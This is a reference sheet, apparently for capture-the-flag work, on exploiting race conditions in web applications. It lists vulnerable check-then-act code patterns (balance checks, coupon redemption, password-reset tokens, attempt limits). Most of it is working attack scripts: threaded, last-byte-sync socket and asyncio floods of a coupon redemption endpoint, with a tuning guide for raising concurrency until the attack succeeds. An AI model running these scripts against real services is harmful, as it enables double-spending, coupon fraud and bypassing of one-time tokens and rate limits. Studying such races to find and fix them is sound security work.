# Race Condition Strategies Reference

## Race Condition Categories

### 1. TOCTOU — Check-Then-Act
```python
# Source:
if user.balance >= amount:        # CHECK  ← race window here
    time.sleep(0)                  # any gap, even tiny
    user.balance -= amount         # ACT
    db.commit()
# Attack: send concurrent requests, both pass the check before either acts
```

### 2. Coupon / One-Time Use Bypass
```python
# Source:
coupon = db.query(Coupon).filter_by(code=code, used=False).first()  # CHECK
if coupon:
    apply_discount(coupon)
    coupon.used = True             # ACT — not atomic
    db.commit()
# Attack: concurrent requests use same coupon before it's marked used
```

### 3. File-Based Race
```python
# Source:
if not os.path.exists(lockfile):   # CHECK
    open(lockfile, 'w').write(pid) # ACT — not atomic
# Attack: two processes both see file absent simultaneously
```

### 4. Token / OTP Reuse
```python
# Source:
token = db.get(user_id, "reset_token")   # CHECK
if token == submitted:
    delete_token(user_id)                 # ACT
    reset_password(user_id, new_pass)
# Attack: concurrent requests both read token before it's deleted
```

### 5. Limit Bypass (e.g. flag reveal after N tries)
```python
# Source:
if attempt_count < MAX_ATTEMPTS:   # CHECK
    attempt_count += 1             # not atomic
    return check_flag(guess)
# Attack: concurrent requests all pass check before counter increments
```

---

## Window Size Analysis

Count operations between CHECK and ACT from source:
- DB query between → medium window (~10ms) → 10–20 concurrent threads enough
- Just variable assignment → tiny window (<1ms) → need 50–100 threads + Last-Byte Sync
- `time.sleep()` present → large window → easy race

---

## Isolation Test

```python
# /tmp/aurelinth/test_race_isolation.py
import threading

balance = 100
amount = 100
wins = 0

def transfer():
    global balance, wins
    if balance >= amount:   # CHECK
        balance -= amount   # ACT
        wins += 1

threads = [threading.Thread(target=transfer) for _ in range(10)]
for t in threads: t.start()
for t in threads: t.join()

print(f"Balance: {balance}, Wins: {wins}")
# If wins > 1 → race condition confirmed
```

---

## Strategy A — Threading (medium window)

```python
# /tmp/aurelinth/exploit_race_threads.py
import requests
import threading

BASE = "http://LOCAL_TARGET"

def make_session():
    s = requests.Session()
    s.post(f"{BASE}/register", data={"username": f"user{id(s)}", "password": "pwn"})
    s.post(f"{BASE}/login", data={"username": f"user{id(s)}", "password": "pwn"})
    return s

s = make_session()
results = []
lock = threading.Lock()

def attack():
    r = s.get(f"{BASE}/redeem?code=SAVE50")
    with lock:
        results.append((r.status_code, r.text[:100]))

N = 20
threads = [threading.Thread(target=attack) for _ in range(N)]
for t in threads: t.start()
for t in threads: t.join()

for r in results:
    print(r)
```

## Strategy B — Last-Byte Sync (tiny window, HTTP/1.1)

```python
# /tmp/aurelinth/exploit_race_lastbyte.py
# Send N requests, hold back last byte of each, release simultaneously
import socket

def send_partial(host, port, path):
    s = socket.socket()
    s.connect((host, port))
    request = (
        f"GET {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Length: 1\r\n"
        f"\r\n"
    )
    s.send(request[:-1].encode())
    return s

host, port = "localhost", 8888
sockets = [send_partial(host, port, "/redeem?code=SAVE50") for _ in range(30)]

for s in sockets:
    s.send(b"\n")

for s in sockets:
    try:
        resp = s.recv(4096).decode(errors='ignore')
        if "flag" in resp.lower() or "200" in resp[:20]:
            print("[HIT]", resp[:200])
    except:
        pass
    s.close()
```

## Strategy C — asyncio (highest concurrency)

```python
# /tmp/aurelinth/exploit_race_async.py
import asyncio
import aiohttp

BASE = "http://LOCAL_TARGET"

async def attack(session, i):
    async with session.get(f"{BASE}/redeem?code=SAVE50") as r:
        text = await r.text()
        return r.status, text[:100]

async def main():
    async with aiohttp.ClientSession() as session:
        tasks = [attack(session, i) for i in range(50)]
        results = await asyncio.gather(*tasks)
    for r in results:
        print(r)

asyncio.run(main())
```

---

## Tuning Guide

1. Start with Strategy A (threading), N=20
2. If no win after 3 runs → increase N to 50
3. If still no win → switch to Strategy B (last-byte sync)
4. If DB uses `SELECT FOR UPDATE` or `SERIALIZABLE` isolation → NOT exploitable, stop

Note: `aiohttp` install if needed: `pip install aiohttp --break-system-packages -q`
